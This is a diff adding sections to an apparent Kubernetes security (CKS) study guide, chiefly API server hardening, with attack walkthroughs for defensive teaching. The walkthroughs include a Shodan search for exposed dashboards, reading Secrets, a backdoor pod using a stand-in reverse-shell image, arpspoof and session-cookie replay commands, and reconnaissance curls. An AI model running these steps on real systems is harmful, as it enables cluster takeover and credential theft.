@@ -10237,6 +10237,56 @@ EOF
 
                 <h4>The "Skip" Button — Tesla's Fatal Misconfiguration</h4>
                 <p>Kubernetes Dashboard versions prior to 2.0.0 included a <strong>"Skip" button on the login page</strong>. This button was not a bug — it was a deliberate feature for development environments. When clicked, it granted the user the Dashboard ServiceAccount's permissions with zero authentication. Since the default Dashboard ServiceAccount had cluster-admin, clicking "Skip" gave full cluster control to anyone who could reach the login page. Tesla's Dashboard had this button enabled AND was exposed on the public internet. The attacker did not need a password, a token, or an exploit. They clicked a button. In Dashboard 2.0.0+, the "Skip" button is disabled by default, but it can still be re-enabled with the <code>--enable-skip-login</code> flag. <strong>Never use this flag in any environment — including development.</strong></p>
+
+                <h4>Dashboard Attack Walkthrough — The Exact Sequence</h4>
+                <p>This is the attacker's perspective — the exact steps that compromised Tesla and continue to compromise unsecured clusters every day:</p>
+                <div class="diagram-container">
+                    <div class="diagram-title">Phase 1-2: Discovery → Access (under 2 minutes)</div>
+<pre>
+  $ shodan search 'product:"Kubernetes" ssl:"Dashboard"' --fields ip_str,port
+  203.0.113.42  8443    ← Exposed Dashboard found
+
+  Attacker opens https://203.0.113.42:8443 in a browser.
+  → Dashboard login page. "Skip" button present.
+  → Click "Skip" → Logged in as cluster-admin.
+  → No password. No token. No exploit required.
+
+  PHASE 3: Credential Extraction (2 minutes)
+  ─────────────────────────────────────────
+  Dashboard → Config & Storage → Secrets → anihpj-prod
+  → anihpj-db-credentials: DATABASE_URL=postgres://user:pass@db:5432/jobpost
+  → aws-s3-backup: AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY
+  → anihpj-tls: TLS private key for anihpj.com
+
+  PHASE 4: Persistence (3 minutes)
+  ────────────────────────────────
+  Dashboard → Workloads → Create → Pod
+  Name: nginx-backdoor
+  Image: evil-registry.io/reverse-shell:latest
+  → Pod deploys. Reverse shell calls home. Permanent access established.
+
+  TOTAL: ~7 minutes. Attacker has: all Secrets, cloud credentials, backdoor.
+</pre>
+                </div>
+
+                <h4>Dashboard Deployment Decision Tree</h4>
+                <div class="decision-tree">
+                    <div class="decision-node question">🖥️ Do you truly need a web UI, or is kubectl/k9s/Lens sufficient?</div>
+                    <div class="decision-branches">
+                        <div><div class="decision-node no">❌ kubectl is enough → Skip Dashboard entirely. Zero attack surface is always more secure.</div></div>
+                        <div><div class="decision-node yes">✅ UI needed → Continue.</div></div>
+                    </div>
+                    <div class="decision-node question">🔐 Can you enforce OIDC with MFA (Google, Azure AD, Okta)?</div>
+                    <div class="decision-branches">
+                        <div><div class="decision-node yes">✅ Yes → Deploy with OIDC + ClusterIP + NetworkPolicy. Enterprise-grade. Users authenticate via IdP.</div></div>
+                        <div><div class="decision-node no">⚠️ No OIDC → Use kubectl port-forward + scoped SA token only. Never expose on network.</div></div>
+                    </div>
+                    <div class="decision-node question">🌐 Does access need to work remotely?</div>
+                    <div class="decision-branches">
+                        <div><div class="decision-node no">✅ Local only → kubectl proxy on localhost. Zero network exposure.</div></div>
+                        <div><div class="decision-node yes">⚠️ Remote → VPN only. NetworkPolicy restricts to VPN CIDR. Never public internet.</div></div>
+                    </div>
+                </div>
             </div>
 
             <div class="section-block" id="s5-2">
@@ -11659,6 +11709,43 @@ EOF
                     </table>
                 </div>
 
+                <h4>TLS Attack Walkthrough — What Happens Without HTTPS</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">Man-in-the-Middle Attack on Plain HTTP — The Real Risk</div>
+<pre>
+  SCENARIO: User on coffee shop WiFi accesses http://anihpj.com/jobs/
+  ────────────────────────────────────────────────────────────────────
+
+  STEP 1: Attacker on same WiFi runs ARP spoofing
+  $ arpspoof -i wlan0 -t 192.168.1.50 192.168.1.1
+  → Attacker positions between user and the router.
+
+  STEP 2: User types http://anihpj.com (NOT https)
+  → Request goes through attacker's machine.
+  → Attacker sees EVERYTHING in plaintext:
+    GET /jobs/ HTTP/1.1
+    Host: anihpj.com
+    Cookie: sessionid=abc123def456...    ← SESSION COOKIE STOLEN
+
+  STEP 3: Attacker now has a valid session cookie
+  $ curl https://anihpj.com/admin/ -H "Cookie: sessionid=abc123..."
+  → Attacker is LOGGED IN as the user. Can view profile, change settings,
+    or if user is admin, access the Django admin panel.
+
+  WITH TLS + HSTS enabled:
+  ─────────────────────────
+  User types http://anihpj.com → Browser auto-redirects to https://
+  (HSTS preload or previous visit). Even on first visit, if the site
+  is on the HSTS preload list, browser NEVER attempts HTTP.
+  Attacker sees only: CONNECT anihpj.com:443 → ENCRYPTED DATA.
+  Session cookie never exposed. Attack FAILS.
+
+  🔑 KEY INSIGHT: TLS is not about hiding your content — it is about
+     protecting your users' SESSION TOKENS from network-level attackers.
+     One session token stolen = one user account compromised.
+</pre>
+                </div>
+
                 <div class="visual-summary">
                     <h4>📊 Chapter 7 Visual Summary</h4>
                     <div class="vs-grid">
@@ -11691,7 +11778,2005 @@ EOF
                 </div>
             </div>
         </div></section>
-    <section class="chapter-section" id="part3"><h2><span>🟡 Part 3: Cluster Hardening</span><span class="chapter-badge">Chapters 8-12 · CKS 15%</span></h2><div id="ch8"><div class="content-placeholder"><div class="placeholder-icon">🔒</div><p>Chapter 8: Restricting API Server Access — Content coming soon</p></div></div><div id="ch9"><div class="content-placeholder"><div class="placeholder-icon">👥</div><p>Chapter 9: RBAC for Security — Content coming soon</p></div></div><div id="ch10"><div class="content-placeholder"><div class="placeholder-icon">🤖</div><p>Chapter 10: Service Accounts — Content coming soon</p></div></div><div id="ch11"><div class="content-placeholder"><div class="placeholder-icon">🔐</div><p>Chapter 11: Node Restriction & Authorization — Content coming soon</p></div></div><div id="ch12"><div class="content-placeholder"><div class="placeholder-icon">⬆️</div><p>Chapter 12: Version Management — Content coming soon</p></div></div></section>
+    <section class="chapter-section" id="part3"><h2><span>🟡 Part 3: Cluster Hardening</span><span class="chapter-badge">Chapters 8-12 · CKS 15%</span></h2>
+        <div id="ch8">
+            <div class="chapter-intro">
+                <h3>Chapter 8: Restricting API Server Access</h3>
+                <p>The Kubernetes API server is the <strong>single entry point</strong> for every operation in your cluster. Every kubectl command. Every controller reconciliation. Every pod readiness check. Every audit log entry. If an attacker gains access to the API server, they own the entire cluster — every Secret, every pod, every node, every cloud credential. This chapter teaches you to lock down the API server: disable anonymous access, enforce authentication for every request, enable audit logging for forensic traceability, restrict network access to trusted IP ranges, and remove the insecure port that bypasses all security controls. These are the most fundamental hardening steps — and the most heavily tested on the CKS exam.</p>
+                <div class="chapter-meta">
+                    <span class="meta-tag">🟡 Intermediate</span>
+                    <span class="meta-tag">⏱️ ~2 hours</span>
+                    <span class="meta-tag">🔒 API Server</span>
+                    <span class="meta-tag">📝 Audit Logging</span>
+                </div>
+            </div>
+
+            <div class="learning-objectives">
+                <h4>🎯 What You'll Learn</h4>
+                <ul>
+                    <li>✅ Understand why the API server is the most critical security component in Kubernetes</li>
+                    <li>✅ Disable anonymous authentication — require valid credentials for every API request</li>
+                    <li>✅ Configure audit logging with a policy that captures the right level of detail</li>
+                    <li>✅ Restrict API server network access to trusted IP ranges using cloud firewalls</li>
+                    <li>✅ Remove the insecure port (8080) — verify it is completely disabled</li>
+                </ul>
+            </div>
+
+            <div class="cka-chapter-relevance">
+                <span class="relevance-label">🎓 CKS Relevance</span>
+                <div class="relevance-domains">
+                    <span class="cka-domain-badge">Cluster Hardening <span class="cka-weight">15%</span></span>
+                    <span class="cka-domain-badge">Monitoring & Runtime <span class="cka-weight">20%</span></span>
+                </div>
+            </div>
+
+            <div class="cka-exam-tip">
+                <h5>🧠 The API Server Hardening Pattern</h5>
+                <p>CKS exam tasks for API server hardening follow the same pattern as CIS checks: (1) Identify which flag is insecure, (2) Edit <code>/etc/kubernetes/manifests/kube-apiserver.yaml</code>, (3) Add/change the flag to the secure value, (4) Save and wait for the kubelet to restart the static pod, (5) Verify the change took effect with curl or kubectl. <strong>Always make a backup before editing the manifest.</strong> A dead API server = a failed exam.</p>
+            </div>
+
+            <div class="section-block" id="s8-1">
+                <h3>8.1 The API Server is the Crown Jewel</h3>
+                <p>Every operation in Kubernetes — whether initiated by a human with kubectl, a controller manager reconciling state, a kubelet reporting node status, or a pod reading a ConfigMap — flows through the <strong>kube-apiserver</strong>. It is the single component that reads from and writes to etcd. There is no back door. There is no direct etcd path (in a properly configured cluster). The API server is the gatekeeper, the authorizer, the auditor, and the admission controller — all in one process. If you compromise the API server, you bypass every security control in Kubernetes.</p>
+
+                <div class="info-box danger">
+                    <h5>🔴 If the API Server Falls, Everything Falls</h5>
+                    <p>A compromised API server can: read all Secrets in all namespaces, create cluster-admin ServiceAccounts, delete audit logs, modify RBAC rules to create permanent backdoors, deploy malicious pods on every node, and exfiltrate all data stored in etcd. <strong>Protecting the API server is not one security task among many — it is THE security task.</strong> Every other control (NetworkPolicy, Seccomp, AppArmor) assumes the API server is secure. If it is not, those controls are irrelevant.</p>
+                </div>
+
+                <h4>Everything Flows Through the API Server</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">The API server is the single entry point for ALL cluster operations</div>
+<pre>
+                        🌐 External Users (kubectl)
+                        📦 Internal Pods (ServiceAccount tokens)
+                        ⚙️  kubelet (node status, pod logs)
+                        🔄 Controller Manager (reconciliation)
+                        📊 Scheduler (pod placement)
+                             │     │     │     │
+                             ▼     ▼     ▼     ▼
+                    ┌────────────────────────────────────┐
+                    │        🧠 kube-apiserver           │
+                    │        ┌─────────────────────┐     │
+                    │        │ 1. AUTHENTICATION   │     │
+                    │        │    Who are you?     │     │
+                    │        ├─────────────────────┤     │
+                    │        │ 2. AUTHORIZATION    │     │
+                    │        │    What can you do? │     │
+                    │        ├─────────────────────┤     │
+                    │        │ 3. ADMISSION CTRL   │     │
+                    │        │    Is this allowed? │     │
+                    │        ├─────────────────────┤     │
+                    │        │ 4. AUDIT LOGGING    │     │
+                    │        │    Record everything│     │
+                    │        └──────────┬──────────┘     │
+                    └───────────────────┼────────────────┘
+                                        │
+                                        ▼
+                              ┌─────────────────┐
+                              │   🗄️  etcd      │
+                              │   (persisted)   │
+                              └─────────────────┘
+</pre>
+                </div>
+
+                <h4>What Attackers Can Learn from the API Server — Even Without Credentials</h4>
+                <p>Even with anonymous auth enabled and minimal RBAC, the API server leaks valuable reconnaissance information to unauthenticated users. The <strong>discovery API</strong> (<code>/api</code>, <code>/apis</code>) returns the complete list of available API groups, resources, and versions — telling an attacker exactly which Kubernetes version you are running and which features are enabled. The <strong>version endpoint</strong> (<code>/version</code>) returns the exact Git commit and build date of your API server. An attacker can cross-reference this against the CVE database to identify unpatched vulnerabilities specific to your version. This is why <code>--anonymous-auth=false</code> is not just about preventing data access — it is about denying attackers the reconnaissance they need to plan an attack.</p>
+                <div class="diagram-container">
+                    <div class="diagram-title">What an Anonymous Attacker Can Discover About Your Cluster</div>
+<pre>
+  $ curl -k https://10.0.0.1:6443/version
+  {
+    "major": "1",
+    "minor": "30",
+    "gitVersion": "v1.30.0",          ← Attacker knows your exact version
+    "gitCommit": "7c48c2bd...",        ← Maps to specific CVE database entry
+    "buildDate": "2024-04-17T...",     ← Knows when you last updated
+    "platform": "linux/amd64"          ← Knows your architecture
+  }
+  → Attacker now searches: "Kubernetes v1.30.0 CVEs"
+  → Finds CVE-2024-XXXX affecting your exact version
+
+  $ curl -k https://10.0.0.1:6443/apis
+  → Returns ALL available API groups:
+    apps/v1, batch/v1, networking.k8s.io/v1, rbac.authorization.k8s.io/v1,
+    policy/v1 (PodSecurity is enabled!), cert-manager.io/v1 (you use cert-manager),
+    monitoring.coreos.com/v1 (you use Prometheus operator)
+  → Attacker now knows your entire software stack from ONE anonymous request.
+</pre>
+                </div>
+            </div>
+
+            <div class="section-block" id="s8-2">
+                <h3>8.2 Disabling Anonymous Authentication</h3>
+                <p>By default, Kubernetes allows <strong>anonymous requests</strong> — requests that carry no authentication credentials. These requests are assigned the username <code>system:anonymous</code> and the group <code>system:unauthenticated</code>. While the default RBAC rules grant anonymous users almost no permissions, a misconfigured cluster may have accidentally granted access — and even without RBAC permissions, anonymous users can still query the API server's version, health endpoints, and discovery APIs, leaking valuable information about your cluster version and available resources.</p>
+
+                <div class="info-box note">
+                    <h5>📖 CIS 1.2.1 — The Most Fundamental Check</h5>
+                    <p>The CIS Kubernetes Benchmark's very first API server check is: <strong>"Ensure that the --anonymous-auth argument is set to false."</strong> This is check #1.2.1 — and it is the most common FAIL on default clusters. Fixing it is the first thing you do on any hardening task.</p>
+                </div>
+
+                <h4>Fixing Anonymous Authentication — Step by Step</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">Edit the API server manifest to disable anonymous access</div>
+<pre>
+  # Step 1: Back up the manifest (ALWAYS do this first)
+  $ cp /etc/kubernetes/manifests/kube-apiserver.yaml \
+       /root/kube-apiserver.yaml.backup
+
+  # Step 2: Edit the manifest
+  $ vi /etc/kubernetes/manifests/kube-apiserver.yaml
+
+  # Find the command section and ensure this flag exists:
+  spec:
+    containers:
+    - command:
+      - kube-apiserver
+      - --anonymous-auth=false          # ← ADD or CHANGE this to false
+
+  # Step 3: Save and exit. kubelet detects the change and restarts
+  # the API server automatically (10-30 seconds).
+
+  # Step 4: Verify anonymous access is blocked
+  $ curl -k https://localhost:6443/api/v1/namespaces
+  {
+    "kind": "Status",
+    "status": "Failure",
+    "message": "Unauthorized",          # ← 401 Unauthorized ✅
+    "reason": "Unauthorized",
+    "code": 401
+  }
+
+  # Step 5: Verify authenticated access still works
+  $ kubectl get namespaces
+  → Returns namespace list (using valid kubeconfig credentials) ✅
+</pre>
+                </div>
+
+                <div class="info-box warning">
+                    <h5>⚠️ After Disabling Anonymous Auth — What Breaks?</h5>
+                    <p>Most things keep working because they already use valid credentials: kubectl uses client certificates, controllers use ServiceAccount tokens, kubelets use bootstrap certificates. However, <strong>liveness and readiness probes configured with HTTP GET requests to the API server health endpoint will fail</strong> if they do not include authentication. The health endpoints (<code>/healthz</code>, <code>/livez</code>, <code>/readyz</code>) are exempt from authentication by default, but custom probes targeting other API paths will break. Always test after disabling anonymous auth.</p>
+                </div>
+
+                <h4>What system:anonymous Can Actually Do — Testing Anonymous Permissions</h4>
+                <p>Before disabling anonymous auth, it is valuable to audit what an anonymous user could have accessed. This tells you whether the cluster was already compromised through this vector:</p>
+                <div class="diagram-container">
+                    <div class="diagram-title">Audit anonymous permissions before locking down</div>
+<pre>
+  # Check what anonymous can do RIGHT NOW
+  $ kubectl auth can-i --list --as=system:anonymous
+  Resources   Non-Resource URLs   Resource Names   Verbs
+  *.*         []                  []               []
+  → Empty = no permissions (good!).
+
+  # Check if anonymous was given any ClusterRoleBinding (BAD!)
+  $ kubectl get clusterrolebindings -o yaml | grep -A5 system:anonymous
+  → If ANY results appear, anonymous has been granted permissions.
+    This is a critical finding — remove those bindings IMMEDIATELY.
+
+  # Test anonymous access explicitly
+  $ kubectl get pods --as=system:anonymous
+  → Error from server (Forbidden): pods is forbidden
+  → If this SUCCEEDS, your cluster is already compromised.
+
+  # Test anonymous access to the version endpoint
+  $ curl -k https://localhost:6443/version
+  → If this returns JSON, anonymous can see your version.
+  → After fix: should return 401 Unauthorized.
+</pre>
+                </div>
+            </div>
+
+            <div class="section-block" id="s8-3">
+                <h3>8.3 Enabling Audit Logging on the API Server</h3>
+                <p>Audit logging records <strong>every API request</strong> — who made it, what resource they accessed, what action they performed, and whether it succeeded or failed. Without audit logs, a security incident is a mystery: you have no way to determine which credentials were compromised, what data was accessed, or how long the attacker was in your cluster. With audit logs, you have a forensic timeline of every action. This is not optional for production — it is a requirement for PCI-DSS, SOC 2, HIPAA, and virtually every compliance framework.</p>
+
+                <h4>Audit Policy Levels — How Much to Log</h4>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Level</th><th>What It Logs</th><th>When to Use</th><th>Disk Impact</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>None</strong></td><td>Nothing — the event is not recorded at all</td><td>Noisy events (e.g., watch connections, health checks) that would flood the logs</td><td style="color:#4ade80;">Zero</td></tr>
+                            <tr><td><strong>Metadata</strong></td><td>Who, what resource, what verb, when, source IP, response code — but NOT the request/response body</td><td>Most events. Sufficient for compliance and most investigations.</td><td style="color:#eab308;">Low</td></tr>
+                            <tr><td><strong>Request</strong></td><td>Metadata + the full request body</td><td>Events where you need to see WHAT was submitted (e.g., pod specs, ConfigMap data)</td><td style="color:#f97316;">Medium</td></tr>
+                            <tr><td><strong>RequestResponse</strong></td><td>Metadata + request body + response body</td><td>Critical resources (Secrets access, RBAC changes) where you need the full picture</td><td style="color:#ef4444;">High — use sparingly</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Audit Policy YAML — Annotated Example</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">Complete audit policy — what to log and at what level</div>
+<pre>
+  # /etc/kubernetes/audit-policy.yaml
+  apiVersion: audit.k8s.io/v1
+  kind: Policy
+  rules:
+  # Don't log noisy events (saves disk space)
+  - level: None
+    resources:
+    - group: ""
+      resources: ["events"]
+  - level: None
+    userGroups: ["system:nodes"]
+    verbs: ["get"]
+    resources:
+    - group: ""
+      resources: ["nodes/status", "pods/status"]
+
+  # Log Secret access metadata (who accessed which Secret, but NOT the values)
+  - level: Metadata
+    resources:
+    - group: ""
+      resources: ["secrets", "configmaps"]
+
+  # Log full RBAC changes (who changed permissions)
+  - level: RequestResponse
+    resources:
+    - group: "rbac.authorization.k8s.io"
+      resources: ["*"]
+
+  # Log pod exec with full request (captures the command executed)
+  - level: RequestResponse
+    resources:
+    - group: ""
+      resources: ["pods/exec"]
+
+  # Default: log metadata for everything else
+  - level: Metadata
+
+  # API server flags to enable this policy:
+  # --audit-policy-file=/etc/kubernetes/audit-policy.yaml
+  # --audit-log-path=/var/log/kubernetes/audit.log
+  # --audit-log-maxage=30      (retain logs for 30 days)
+  # --audit-log-maxbackup=10   (keep up to 10 rotated files)
+  # --audit-log-maxsize=100    (rotate at 100 MB per file)
+</pre>
+                </div>
+
+                <div class="info-box tip">
+                    <h5>💡 Audit Best Practice: Log RBAC Changes at RequestResponse</h5>
+                    <p>If an attacker modifies RBAC to create a backdoor, you need to see exactly what they changed. Always log <code>rbac.authorization.k8s.io</code> resources at <code>RequestResponse</code> level. This captures both the RBAC manifest that was submitted AND the API server's confirmation response. Combined with <code>Metadata</code> logging for Secrets access, you have full forensic coverage of the most critical attack paths.</p>
+                </div>
+
+                <h4>Reading Audit Logs — Understanding the JSON Format</h4>
+                <p>Audit logs are written as JSON objects — one per line — to the file specified by <code>--audit-log-path</code>. Understanding the JSON structure lets you query logs with <code>jq</code> to answer forensic questions like "who deleted that pod?" or "which IP tried to access Secrets?":</p>
+                <div class="diagram-container">
+                    <div class="diagram-title">Anatomy of a Single Audit Log Entry</div>
+<pre>
+  {
+    "kind": "Event",
+    "apiVersion": "audit.k8s.io/v1",
+    "level": "RequestResponse",          ← Which audit level captured this
+    "auditID": "abc123-def456",          ← Unique ID to correlate request+response
+    "stage": "ResponseComplete",         ← When in the request lifecycle
+    "requestURI": "/api/v1/namespaces/anihpj-prod/secrets/anihpj-db",
+    "verb": "get",                        ← What action (get, create, delete, list)
+    "user": {
+      "username": "system:serviceaccount:anihpj-prod:anihpj-sa",  ← WHO
+      "groups": ["system:serviceaccounts", "system:authenticated"]
+    },
+    "sourceIPs": ["10.0.1.23"],           ← WHERE from
+    "userAgent": "anihpj-app/v2.1.0",     ← WHAT client
+    "objectRef": {
+      "resource": "secrets",               ← WHAT resource
+      "name": "anihpj-db",
+      "namespace": "anihpj-prod"
+    },
+    "responseStatus": {
+      "metadata": {},
+      "code": 200                          ← SUCCESS (403 = denied, 401 = unauthenticated)
+    },
+    "requestReceivedTimestamp": "2024-06-15T14:23:07.123456Z",
+    "stageTimestamp": "2024-06-15T14:23:07.234567Z"
+  }
+
+  # QUERY EXAMPLES with jq:
+  # Find all Secret access events
+  $ cat audit.log | jq 'select(.objectRef.resource=="secrets")'
+
+  # Find all failed (403) requests
+  $ cat audit.log | jq 'select(.responseStatus.code==403)'
+
+  # Find requests from a specific IP
+  $ cat audit.log | jq 'select(.sourceIPs[]=="10.0.1.23")'
+
+  # Find all delete operations
+  $ cat audit.log | jq 'select(.verb=="delete")'
+</pre>
+                </div>
+
+                <h4>Audit Log Disk Management — Don't Fill the Control Plane Disk</h4>
+                <p>Audit logs at RequestResponse level can generate gigabytes per day on a busy cluster. If the audit log fills the control plane disk, the API server cannot write logs and may stop accepting requests. This is a self-inflicted denial of service. The API server flags <code>--audit-log-maxage</code>, <code>--audit-log-maxbackup</code>, and <code>--audit-log-maxsize</code> control log rotation — but they only rotate the file, they do not enforce total disk usage. For production, always pair file-based audit logging with an <strong>audit webhook backend</strong> that streams logs to an external system (Elasticsearch, Splunk, or a cloud SIEM) where they can be properly stored, indexed, and queried without consuming control plane disk space.</p>
+            </div>
+
+            <div class="section-block" id="s8-4">
+                <h3>8.4 Restricting API Server to Specific IP Ranges</h3>
+                <p>Authentication and authorization control WHO can access the API and WHAT they can do. But there is a prior question: <strong>who can even reach the API server in the first place?</strong> If the API server's port 6443 is exposed to the public internet, attackers can attempt authentication, probe for misconfigurations, and launch brute-force attacks — even if they never successfully authenticate. Network-layer restriction adds a critical first barrier: the attacker's packets never reach the API server at all.</p>
+
+                <h4>API Server IP Restriction — The 4-Layer Approach</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">Defense in depth for API server network access</div>
+<pre>
+  LAYER 1: Cloud Firewall / Security Group
+  ─────────────────────────────────────────
+  Rule: ALLOW TCP 6443 FROM 10.0.0.0/8 (internal network)
+  Rule: DENY  TCP 6443 FROM 0.0.0.0/0  (internet)
+  → Attacker on the internet cannot even establish a TCP connection.
+  → Port 6443 is invisible to port scanners like Shodan and Masscan.
+
+  LAYER 2: Kubernetes Authentication
+  ───────────────────────────────────
+  --anonymous-auth=false
+  → Even if an attacker gets past the firewall (e.g., compromised internal host),
+    they must present valid credentials to make any API call.
+
+  LAYER 3: Kubernetes RBAC
+  ─────────────────────────
+  → Even if an attacker has valid credentials (e.g., a stolen kubeconfig),
+    RBAC limits what those credentials can do to a specific namespace and verbs.
+
+  LAYER 4: Audit Logging
+  ───────────────────────
+  → Every access attempt — successful or failed — is recorded with timestamp,
+    source IP, username, and the exact API call. Forensic evidence for
+    investigation and compliance.
+</pre>
+                </div>
+
+                <h4>API Server Authentication Methods — Comparison</h4>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Method</th><th>How It Works</th><th>Use Case</th><th>Security Level</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>X.509 Client Certificate</strong></td><td>kubectl uses cert from kubeconfig; API server verifies against cluster CA</td><td>Human administrators (kubeadm default)</td><td style="color:#4ade80;">✅ Strong (cert-based)</td></tr>
+                            <tr><td><strong>Bearer Token (ServiceAccount)</strong></td><td>SA token in Authorization header; signed by K8s token controller</td><td>Pods calling the API from inside the cluster</td><td style="color:#eab308;">⚠️ Tokens can be long-lived</td></tr>
+                            <tr><td><strong>OIDC (OpenID Connect)</strong></td><td>External IdP (Google, GitHub, Azure AD) issues JWT; API server validates</td><td>Enterprise SSO for human users</td><td style="color:#4ade80;">✅ Strong (supports MFA)</td></tr>
+                            <tr><td><strong>Webhook Token Auth</strong></td><td>External server validates token via HTTP callback</td><td>Custom authentication systems</td><td style="color:#eab308;">⚠️ Depends on webhook security</td></tr>
+                            <tr><td><strong>Bootstrap Tokens</strong></td><td>Short-lived tokens for new nodes joining the cluster</td><td>kubeadm join — temporary use only</td><td style="color:#4ade80;">✅ Auto-expiring</td></tr>
+                            <tr><td><strong>Static Token File</strong></td><td>Tokens stored in CSV file on control plane disk</td><td style="color:#ef4444;">❌ NEVER use in production</td><td style="color:#ef4444;">🔴 Tokens never rotate, stored in plaintext</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Cloud Firewall Integration — Putting Theory into Practice</h4>
+                <p>The 4-layer model works, but implementing it requires knowing the exact cloud-specific commands. Here is how to restrict API server access on the three major cloud providers — and the equivalent for on-premises clusters using iptables:</p>
+                <div class="diagram-container">
+                    <div class="diagram-title">Restricting Port 6443 — Cloud Provider Commands</div>
+<pre>
+  # AWS: Security Group Rule
+  $ aws ec2 authorize-security-group-ingress \
+      --group-id sg-abc123 \
+      --protocol tcp --port 6443 \
+      --cidr 10.0.0.0/8
+  # Also: REVOKE the 0.0.0.0/0 rule if it exists!
+  $ aws ec2 revoke-security-group-ingress \
+      --group-id sg-abc123 \
+      --protocol tcp --port 6443 \
+      --cidr 0.0.0.0/0
+
+  # Azure: Network Security Group Rule
+  $ az network nsg rule create \
+      --nsg-name k8s-nsg \
+      --name AllowApiServer \
+      --priority 100 \
+      --source-address-prefixes 10.0.0.0/8 \
+      --destination-port-ranges 6443 \
+      --access Allow
+
+  # GCP: Firewall Rule
+  $ gcloud compute firewall-rules create allow-api-server \
+      --network k8s-vpc \
+      --allow tcp:6443 \
+      --source-ranges 10.0.0.0/8
+
+  # On-Premises / Generic Linux: iptables
+  $ iptables -A INPUT -p tcp --dport 6443 -s 10.0.0.0/8 -j ACCEPT
+  $ iptables -A INPUT -p tcp --dport 6443 -j DROP    # Default deny
+  $ iptables-save > /etc/iptables/rules.v4           # Persist
+</pre>
+                </div>
+            </div>
+
+            <div class="section-block" id="s8-5">
+                <h3>8.5 Insecure Port — Removing the Back Door</h3>
+                <p>Older versions of Kubernetes (prior to 1.20) exposed an <strong>insecure API port on 8080</strong> that accepted requests with <strong>no TLS and no authentication</strong>. Anyone who could reach port 8080 could perform any API operation as cluster-admin — no credentials needed, no encryption, no audit log. This port was removed in Kubernetes 1.20, but some clusters running older versions or custom configurations may still have it enabled. The CKS exam expects you to verify it is disabled.</p>
+
+                <div class="info-box danger">
+                    <h5>🔴 The Insecure Port — Complete Bypass of All Security</h5>
+                    <p>Port 8080 bypasses authentication, authorization, admission control, and TLS. If it is enabled, every other security control in this chapter — anonymous auth disabled, audit logging, RBAC — is meaningless. An attacker who can reach port 8080 can do anything. <strong>This is not a vulnerability. This is a deliberate feature that was removed because it is inherently insecure.</strong></p>
+                </div>
+
+                <h4>API Server Ports — Which Are Safe, Which Are Dangerous</h4>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Port</th><th>Purpose</th><th>Security Status</th><th>Action Required</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>6443</strong></td><td>Secure API (TLS + auth)</td><td style="color:#4ade80;">✅ Safe — this is the only port you should expose</td><td>Restrict with firewall to trusted IPs</td></tr>
+                            <tr><td><strong>8080</strong></td><td>Insecure API (no TLS, no auth)</td><td style="color:#ef4444;">🔴 DANGER — removed in 1.20+</td><td>Verify <code>--insecure-port=0</code> or flag absent</td></tr>
+                            <tr><td><strong>10250</strong></td><td>kubelet API</td><td style="color:#eab308;">⚠️ Must be locked with webhook auth</td><td>Anonymous auth disabled, webhook enabled</td></tr>
+                            <tr><td><strong>10255</strong></td><td>kubelet read-only (no auth!)</td><td style="color:#ef4444;">🔴 DANGER — disable</td><td><code>readOnlyPort: 0</code></td></tr>
+                            <tr><td><strong>2379</strong></td><td>etcd client</td><td style="color:#eab308;">⚠️ API server only</td><td>Firewall: allow only from control plane IPs</td></tr>
+                            <tr><td><strong>2380</strong></td><td>etcd peer</td><td style="color:#eab308;">⚠️ etcd members only</td><td>Firewall: allow only between etcd nodes</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Verifying the Insecure Port Is Disabled</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">Check and confirm port 8080 is gone</div>
+<pre>
+  # Step 1: Check the API server manifest for the insecure port flag
+  $ grep insecure-port /etc/kubernetes/manifests/kube-apiserver.yaml
+  → Should show: --insecure-port=0
+  → OR: the flag should be completely absent (removed in 1.20+)
+
+  # Step 2: Verify no process is listening on 8080
+  $ netstat -tlnp | grep 8080
+  → Should return NOTHING (no process listening)
+
+  # Step 3: Verify 8080 is not reachable
+  $ curl http://localhost:8080/api/v1/namespaces
+  → curl: (7) Failed to connect — Connection refused ✅
+
+  # Step 4: Confirm the secure port works (6443)
+  $ curl -k https://localhost:6443/healthz
+  → ok ✅
+
+  # If port 8080 IS listening:
+  # 1. Edit kube-apiserver.yaml, add/change: --insecure-port=0
+  # 2. Save and wait for kubelet to restart the static pod
+  # 3. Re-run netstat -tlnp | grep 8080 → must be empty
+</pre>
+                </div>
+
+                <h4>API Server Before vs After — Security Posture Comparison</h4>
+                <div class="stat-bar-group">
+                    <div class="stat-bar-item">
+                        <span class="stat-bar-label">🔴 Default API Server (no hardening) — Security Score</span>
+                        <span class="stat-bar-value">12% — anonymous access, no audit, insecure port open</span>
+                        <div class="stat-bar"><div class="stat-bar-fill red" style="width: 12%"></div></div>
+                    </div>
+                    <div class="stat-bar-item">
+                        <span class="stat-bar-label">🟡 With Anonymous Auth Disabled Only</span>
+                        <span class="stat-bar-value">35% — credentials required but still no audit trail</span>
+                        <div class="stat-bar"><div class="stat-bar-fill red" style="width: 35%"></div></div>
+                    </div>
+                    <div class="stat-bar-item">
+                        <span class="stat-bar-label">🟡 With Auth + Audit Logging Enabled</span>
+                        <span class="stat-bar-value">65% — authenticated access + forensic record</span>
+                        <div class="stat-bar"><div class="stat-bar-fill red" style="width: 65%"></div></div>
+                    </div>
+                    <div class="stat-bar-item">
+                        <span class="stat-bar-label">🟢 Fully Hardened (Auth + Audit + IP Restriction + No Insecure Port)</span>
+                        <span class="stat-bar-value">95% — multi-layer defense, CKS target state</span>
+                        <div class="stat-bar"><div class="stat-bar-fill red" style="width: 95%"></div></div>
+                    </div>
+                </div>
+
+                <h4>API Server Attack Walkthrough — What an Attacker Sees</h4>
+                <div class="diagram-container">
